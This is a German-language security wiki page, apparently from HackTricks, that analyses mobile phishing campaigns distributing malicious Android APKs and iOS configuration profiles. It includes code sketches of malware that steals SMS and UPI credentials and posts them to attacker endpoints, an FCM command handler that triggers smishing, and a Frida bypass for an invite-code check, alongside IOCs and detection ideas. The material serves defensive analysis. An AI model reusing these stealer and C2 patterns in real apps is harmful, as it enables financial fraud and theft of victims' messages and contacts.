# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Diese Seite behandelt Techniken, die von Bedrohungsakteuren verwendet werden, um **bösartige Android-APKs** und **iOS-Mobilkonfigurationsprofile** durch Phishing (SEO, Social Engineering, gefälschte Stores, Dating-Apps usw.) zu verteilen.
> Das Material ist aus der SarangTrap-Kampagne adaptiert, die von Zimperium zLabs (2025) und anderen öffentlichen Forschungen aufgedeckt wurde.

## Angriffsfluss

1. **SEO/Phishing-Infrastruktur**
* Registrieren Sie Dutzende von ähnlich aussehenden Domains (Dating, Cloud-Sharing, Autodienst…).
– Verwenden Sie lokale Sprachkeywords und Emojis im `<title>`-Element, um bei Google zu ranken.
– Hosten Sie *sowohl* Android (`.apk`) als auch iOS Installationsanleitungen auf derselben Landingpage.
2. **Erste Phase des Downloads**
* Android: direkter Link zu einer *nicht signierten* oder „Drittanbieter-Store“ APK.
* iOS: `itms-services://` oder einfacher HTTPS-Link zu einem bösartigen **mobileconfig**-Profil (siehe unten).
3. **Post-Installations-Social Engineering**
* Bei der ersten Ausführung fragt die App nach einem **Einladungs-/Verifizierungscode** (Illusion des exklusiven Zugangs).
* Der Code wird **über HTTP POST** an das Command-and-Control (C2) gesendet.
* C2 antwortet `{"success":true}` ➜ Malware wird fortgesetzt.
* Sandbox-/AV-Dynamikanalyse, die niemals einen gültigen Code einreicht, sieht **kein bösartiges Verhalten** (Evasion).
4. **Missbrauch von Laufzeitberechtigungen** (Android)
* Gefährliche Berechtigungen werden nur **nach positiver C2-Antwort** angefordert:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Ältere Builds fragten auch nach SMS-Berechtigungen -->
```
* Neuere Varianten **entfernen `<uses-permission>` für SMS aus `AndroidManifest.xml`**, lassen jedoch den Java/Kotlin-Codepfad, der SMS über Reflection liest ⇒ senkt den statischen Score, während er auf Geräten, die die Berechtigung über `AppOps`-Missbrauch oder alte Ziele gewähren, weiterhin funktional bleibt.
5. **Fassade UI & Hintergrundsammlung**
* Die App zeigt harmlose Ansichten (SMS-Viewer, Galerieauswahl), die lokal implementiert sind.
* In der Zwischenzeit exfiltriert sie:
- IMEI / IMSI, Telefonnummer
- Vollständiger `ContactsContract`-Dump (JSON-Array)
- JPEG/PNG von `/sdcard/DCIM`, komprimiert mit [Luban](https://github.com/Curzibn/Luban), um die Größe zu reduzieren
- Optionaler SMS-Inhalt (`content://sms`)
Payloads werden **batch-zippt** und über `HTTP POST /upload.php` gesendet.
6. **iOS-Liefertechnik**
* Ein einzelnes **Mobilkonfigurationsprofil** kann `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` usw. anfordern, um das Gerät in eine „MDM“-ähnliche Aufsicht einzuschreiben.
* Social-Engineering-Anweisungen:
1. Einstellungen öffnen ➜ *Profil heruntergeladen*.
2. Dreimal auf *Installieren* tippen (Screenshots auf der Phishing-Seite).
3. Das nicht signierte Profil vertrauen ➜ Angreifer erhält *Kontakte* & *Foto*-Berechtigung ohne App Store-Überprüfung.
7. **Netzwerkschicht**
* Einfaches HTTP, oft auf Port 80 mit HOST-Header wie `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (kein TLS → leicht zu erkennen).

## Defensive Tests / Red-Team Tipps

* **Umgehung der dynamischen Analyse** – Automatisieren Sie die Einladungscode-Phase mit Frida/Objection, um den bösartigen Zweig zu erreichen.
* **Manifest vs. Laufzeit-Diff** – Vergleichen Sie `aapt dump permissions` mit der Laufzeit `PackageManager#getRequestedPermissions()`; fehlende gefährliche Berechtigungen sind ein Warnsignal.
* **Netzwerk-Kanary** – Konfigurieren Sie `iptables -p tcp --dport 80 -j NFQUEUE`, um unsichere POST-Bursts nach der Codeeingabe zu erkennen.
* **mobileconfig-Inspektion** – Verwenden Sie `security cms -D -i profile.mobileconfig` auf macOS, um `PayloadContent` aufzulisten und übermäßige Berechtigungen zu erkennen.

## Blue-Team Erkennungsideen

* **Zertifikatstransparenz / DNS-Analytik**, um plötzliche Ausbrüche von keyword-reichen Domains zu erfassen.
* **User-Agent & Pfad Regex**: `(?i)POST\s+/(check|upload)\.php` von Dalvik-Clients außerhalb des Google Play.
* **Einladungs-Code-Telemetrie** – POST von 6–8-stelligen numerischen Codes kurz nach der APK-Installation kann auf Staging hinweisen.
* **MobileConfig-Signierung** – Blockieren Sie nicht signierte Konfigurationsprofile über die MDM-Richtlinie.

## Nützlicher Frida-Snippet: Auto-Bypass Einladungscode
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indikatoren (Allgemein)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Zahlung Phishing (UPI) – Dropper + FCM C2 Muster

Dieses Muster wurde in Kampagnen beobachtet, die Regierungsleistungs-Themen missbrauchen, um indische UPI-Anmeldeinformationen und OTPs zu stehlen. Betreiber verknüpfen seriöse Plattformen für die Lieferung und Resilienz.

### Lieferkette über vertrauenswürdige Plattformen
- YouTube-Video-Ablenkung → Beschreibung enthält einen Kurzlink
- Kurzlink → GitHub Pages Phishing-Seite, die das legitime Portal imitiert
- Dasselbe GitHub-Repo hostet eine APK mit einem gefälschten „Google Play“-Badge, das direkt auf die Datei verlinkt
- Dynamische Phishing-Seiten sind auf Replit aktiv; der Remote-Befehlskanal nutzt Firebase Cloud Messaging (FCM)

### Dropper mit eingebettetem Payload und Offline-Installation
- Die erste APK ist ein Installer (Dropper), der die echte Malware unter `assets/app.apk` liefert und den Benutzer auffordert, Wi‑Fi/mobile Daten zu deaktivieren, um die Cloud-Erkennung zu umgehen.
- Der eingebettete Payload wird unter einem harmlosen Label (z. B. „Sichere Aktualisierung“) installiert. Nach der Installation sind sowohl der Installer als auch der Payload als separate Apps vorhanden.

Statische Triage-Tipp (grep nach eingebetteten Payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamische Endpunktentdeckung über Shortlink
- Malware ruft eine Klartext-, durch Kommas getrennte Liste von aktiven Endpunkten von einem Shortlink ab; einfache String-Transformationen erzeugen den endgültigen Pfad der Phishing-Seite.

Beispiel (bereinigt):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-Code:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-basierte UPI-Anmeldeinformationen-Erfassung
- Der Schritt „Zahlung von ₹1 / UPI‑Lite“ lädt ein HTML-Formular des Angreifers von dem dynamischen Endpunkt innerhalb eines WebView und erfasst sensible Felder (Telefon, Bank, UPI-PIN), die an `addup.php` `POST`ed werden.

Minimaler Loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Selbstverbreitung und SMS/OTP-Abfang
- Aggressive Berechtigungen werden beim ersten Start angefordert:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakte werden verwendet, um massenhaft Smishing-SMS von dem Gerät des Opfers zu versenden.
- Eingehende SMS werden von einem Broadcast-Receiver abgefangen und mit Metadaten (Absender, Text, SIM-Slot, gerätespezifische zufällige ID) an `/addsm.php` hochgeladen.

Receiver-Skizze:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) als resilientes C2
- Die Nutzlast registriert sich bei FCM; Push-Nachrichten enthalten ein `_type`-Feld, das als Schalter verwendet wird, um Aktionen auszulösen (z. B. Phishing-Textvorlagen aktualisieren, Verhaltensweisen umschalten).

Beispiel FCM-Nutzlast:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler-Skizze:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Jagdmuster und IOCs
- APK enthält sekundäre Payload unter `assets/app.apk`
- WebView lädt Zahlung von `gate.htm` und exfiltriert zu `/addup.php`
- SMS-Exfiltration zu `/addsm.php`
- Kurzlink-gesteuertes Konfigurationsabrufen (z.B. `rebrand.ly/*`), das CSV-Endpunkte zurückgibt
- Apps, die als generisches „Update/Sicheres Update“ gekennzeichnet sind
- FCM `data` Nachrichten mit einem `_type` Diskriminator in nicht vertrauenswürdigen Apps

### Erkennungs- und Verteidigungsideen
- Markieren Sie Apps, die Benutzer anweisen, das Netzwerk während der Installation zu deaktivieren und dann eine zweite APK von `assets/` seitlich zu laden.
- Alarm bei der Berechtigungstuple: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-basierte Zahlungsflüsse.
- Egress-Überwachung für `POST /addup.php|/addsm.php` auf nicht-unternehmensinternen Hosts; blockieren Sie bekannte Infrastrukturen.
- Mobile EDR-Regeln: nicht vertrauenswürdige App, die sich für FCM registriert und auf ein `_type` Feld verzweigt.

---

## Referenzen

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)

{{#include ../../banners/hacktricks-training.md}}
